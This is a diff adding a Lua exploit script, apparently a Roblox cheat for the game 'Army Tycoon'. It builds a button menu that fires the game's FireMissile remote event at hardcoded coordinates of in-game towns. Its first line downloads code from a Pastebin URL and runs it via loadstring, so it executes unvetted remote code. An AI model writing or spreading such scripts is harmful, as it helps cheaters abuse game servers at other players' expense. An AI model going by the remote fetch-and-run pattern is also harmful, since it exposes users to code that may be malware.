@@ -1,0 +1,34 @@
+local library = loadstring(game:HttpGet("https://pastebin.com/raw/eWKgbdix", true))()
+local w = library:CreateWindow('Army Tycoon')
+
+w:Section("Bomb City/Towns")
+
+local b1 = w:Button("City", function()
+local Missile = "Cruise Missile"
+local Position = Vector3.new(598.362549, 53.0134392, 1990.18506)
+game:GetService("ReplicatedStorage").RE.FireMissile:FireServer(Missile, Position)
+end)
+
+local b2 = w:Button("SandTown 1", function()
+local Missile = "Cruise Missile"
+local Position = Vector3.new(422.774628, 49.1041145, 1990.78552)
+game:GetService("ReplicatedStorage").RE.FireMissile:FireServer(Missile, Position)
+end)
+
+local b3 = w:Button("SandTown 2", function()
+local Missile = "Cruise Missile"
+local Position = Vector3.new(594.911682, 49.104084, 2155.65845)
+game:GetService("ReplicatedStorage").RE.FireMissile:FireServer(Missile, Position)
+end)
+
+local b4 = w:Button("SandTown 3", function()
+local Missile = "Cruise Missile"
+local Position = Vector3.new(746.793396, 49.1041031, 1989.97864)
+game:GetService("ReplicatedStorage").RE.FireMissile:FireServer(Missile, Position)
+end)
+
+local b5 = w:Button("SandTown 4", function()
+local Missile = "Cruise Missile"
+local Position = Vector3.new(602.043884, 49.1041069, 1829.45935)
+game:GetService("ReplicatedStorage").RE.FireMissile:FireServer(Missile, Position)
+end)
